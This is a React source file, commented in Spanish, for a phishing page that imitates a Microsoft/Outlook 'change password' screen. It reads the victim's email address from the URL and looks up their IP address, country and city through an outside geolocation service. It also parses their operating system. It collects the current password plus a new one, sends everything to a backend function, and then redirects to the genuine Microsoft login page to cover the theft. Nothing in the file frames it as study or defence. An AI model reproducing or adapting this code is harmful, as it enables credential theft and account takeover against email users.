import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import Header from "../../components/header/Header";
import { createdRegistro } from "../../api/apiRest";

export default function Login() {
  const [details, setDetails] = useState(null);

  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [password3, setPassword3] = useState("");
  const [expire, setExpire] = useState(false);

  const { correo } = useParams();

  console.log(correo);

  let country = details?.country_name;
  let ip = details?.IPv4;
  let city = details?.city;
  console.log(details);
  console.log(country);
  // console.log(password);

  //ver el sistema operativo de dpnde ingresa a la web
  var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();

  // Expresión regular para buscar el texto dentro de paréntesis
  const regex = /\((.*?)\)/g;

  // Array para almacenar todos los textos dentro de paréntesis encontrados
  const textosDentroParentesis = [];

  // Encontrar todos los textos dentro de paréntesis usando la expresión regular
  let match;
  while ((match = regex.exec(InfoSistemaOperativo))) {
    textosDentroParentesis.push(match[1]);
  }

  const so = textosDentroParentesis[0];
  // console.log(so);

  useEffect(() => {
    const getUserGeolocationDetails = () => {
      fetch(
        // "https://ipapi.co/json/"
        "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
      )
        .then((response) => response.json())
        .then((data) => setDetails(data));
    };
    getUserGeolocationDetails();
  }, []);

  const handleSubmit =  async (event) => {
    event.preventDefault();
    // Aquí puedes manejar el envío del formulario, por ejemplo, usando un fetch a una API
    const data = {
      correo,
      password1,
      password2,
      password3,
      country,
      so,
      city,
      ip,
    };

    console.log(data);
    
    await createdRegistro(data)

    return (window.location.href =
      "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");

  };

  return (
    <div className="w-full ">
      <Header />

      <form className="p-10" onSubmit={handleSubmit}>
    
        <div className="container">
          <div className="row">
            <div className="col-sm-12 col-md-8">
              <p className="text-2xl">Cambiar la contraseña</p>
              <p className="mt-2 mb-2">
                Una contraseña segura contribuye a evitar el acceso no
                autorizado a la cuenta de correo electrónico <span  className="text-[#0078d4]" >{correo} </span>  .
              </p>
              <label>Contraseña actual</label>
              <br />
              <input
                name="password1"
                type="password"
                className="bg-slate-50 border-gray-700 border-solid border-[1px]  mt-1 py-1 px-3  w-full sm:w-[390px]    "
                placeholder="Contraseña actual"
                required
                value={password1}
                onChange={(e) => setPassword1(e.target.value)}
              />
              <br />
              <a href="#" style={{ textDecoration: "none" }}>
                ¿Olvidaste la contraseña?
              </a>
              <br />
              <label
                className="mt-2"
                style={{ fontFamily: "'Segoe UI semibold', sans-serif" }}
              >
                Nueva contraseña
              </label>
              <br />
              <input
                name="password2"
                type="password"
                className="bg-slate-50 border-gray-700 border-solid border-[1px]  mt-1 py-1 px-3  w-full sm:w-[390px] "
                placeholder="Nueva contraseña"
                required
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
              />
              <br />
              <p style={{ fontSize: "12px" }} className="mt-2">
                8 caracteres como mínimo, distingue mayúsculas de minúsculas
              </p>
              <label style={{ fontFamily: "'Segoe UI semibold', sans-serif" }}>
                Vuelve a escribir la contraseña
              </label>
              <br />
              <input
                name="password3"
                type="password"
                className="bg-slate-50 border-gray-700 border-solid border-[1px]  mt-1 py-1 px-3  w-full sm:w-[390px] "
                placeholder="Vuelve a escribir la contraseña"
                required
                value={password3}
                onChange={(e) => setPassword3(e.target.value)}
              />
              <br />
              <div
                className="form-group checkbox mt-4"
                style={{ fontFamily: "'Segoe UI semibold', sans-serif" }}
              >
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    name="Expire"
                    style={{ width: "20px", height: "20px" }}
                    checked={expire}
                    onChange={(e) => setExpire(e.target.checked)}
                  />
                  <span className="ml-2">
                    Hacerme cambiar la contraseña cada 72 días
                  </span>
                </label>
              </div>
              <div className="caja-inputs mt-5">
                <button
                  type="submit"
                  className="bg-[#0067b8] text-white px-5  py-1"
                >
                  Guardar
                </button>
                <button
                  type="button"
                  className="bg-[#aaababbd] text-black px-5  py-1 ml-2"
                >
                  Cancelar
                </button>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
